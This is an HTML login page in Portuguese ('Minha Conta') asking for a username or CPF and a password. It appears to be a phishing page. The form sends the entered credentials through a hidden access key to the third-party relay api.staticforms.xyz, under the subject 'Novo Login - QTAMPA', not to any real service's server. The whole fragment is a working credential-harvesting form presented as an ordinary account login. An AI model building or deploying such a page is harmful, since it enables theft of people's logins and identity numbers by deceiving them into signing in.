<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">	
				<div class="login100-form-title" style="background-image: url(assets/images/bg-01.jpg);">
					<span class="login100-form-title-1">
						Minha Conta
					</span>
				</div>

				<form class="login100-form validate-form" action="https://api.staticforms.xyz/submit" method="post">
					<input type="hidden" name="accessKey" value="38cb07cb-798f-4e87-9bc3-57bf72cffdcf">
					<input type="hidden" name="subject" value="Novo Login - QTAMPA" />
					<div class="wrap-input100 validate-input m-b-26" data-validate="Digite seu Usuário">
						<span class="label-input100">Usuário/CPF</span>
						<input class="input100" type="text" name="$usuarioLogin" placeholder="Digite seu Usuário ou CNPJ">
						<span class="focus-input100"></span>
					</div>

					<div class="wrap-input100 validate-input m-b-18" data-validate = "Digite sua Senha">
						<span class="label-input100">Senha</span>
						<input class="input100" type="password" name="$senhaLogin" placeholder="Digite sua Senha">
						<span class="focus-input100"></span>
					</div>

					<div class="flex-sb-m w-full p-b-30">
						<div class="contact100-form-checkbox">
							<input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
							<label class="label-checkbox100" for="ckb1">
								Lembrar Dados
							</label>
						</div>

						<div>
							<a href="#" class="txt1">
								Esqueceu sua senha?
							</a>
						</div>
					</div>

					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
							Entrar
						</button>
					</div>
				</form>
			</div>
		</div>
	</div>
